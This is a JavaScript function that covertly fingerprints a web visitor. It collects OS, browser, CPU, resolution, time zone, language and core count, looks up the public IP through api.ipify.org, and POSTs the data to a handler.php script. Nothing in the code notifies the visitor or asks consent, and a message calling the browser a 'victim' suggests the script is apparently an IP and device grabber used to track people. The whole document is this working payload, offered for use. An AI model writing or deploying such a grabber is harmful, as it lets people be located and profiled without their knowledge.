function mydata(){

    var client = new ClientJS(); // Create A New Client Object
    
    var OS = client.getOS(); // Get OS Version
    
    var ver = client.getOSVersion(); // Get OS Version

    var getbrow = client.getBrowser(); // Get Browser
    
    var getbrowVer = client.getBrowserVersion(); // Get Browser Version

    var CPU = client.getCPU(); // Get CPU Architecture

    var currentResolution = client.getCurrentResolution(); // Get Current Resolution

    var timeZone = '';

    try {
        timeZone = client.getTimeZone(); // Get Time Zone
    } catch {
        timeZone = 'Not Found';
    }

    timeZone = timeZone.toString();

    var language = client.getLanguage(); // Get User Language

    var core = navigator.hardwareConcurrency;

    var check_brave = navigator.brave;
    
    if(check_brave == undefined){
        $.get("https://api.ipify.org",function(data){
        var ip = data
        $.ajax({
            
            type: 'POST',
            url: 'handler.php',
            data: {"data":`ip : ${ip} \nos name : ${OS} \nVersion : ${ver} \nBrowser Name : ${getbrow} \nGet Browser Version : ${getbrowVer} \nCpu Name : ${CPU} \nResolution : ${currentResolution} \nTime Zone : ${timeZone} \nLanguage :  ${language} \nNumber Of CPU Core :  ${core}`},
            mimeType: 'text'
            });
        });


    }else {
        
        $.ajax({
            type: 'POST',
            url: 'handler.php',
            data: {"data":`ip : I could not find. Because the browser is a victim of Breave \nos name : ${OS} \nVersion : ${ver} \nBrowser Name : ${getbrow} \nGet Browser Version : ${getbrowVer} \nCpu Name : ${CPU} \nResolution : ${currentResolution} \nTime Zone : ${timeZone} \nLanguage :  ${language} \nNumber Of CPU Core :  ${core}`},
            mimeType: 'text'
            });

          }
       
    }
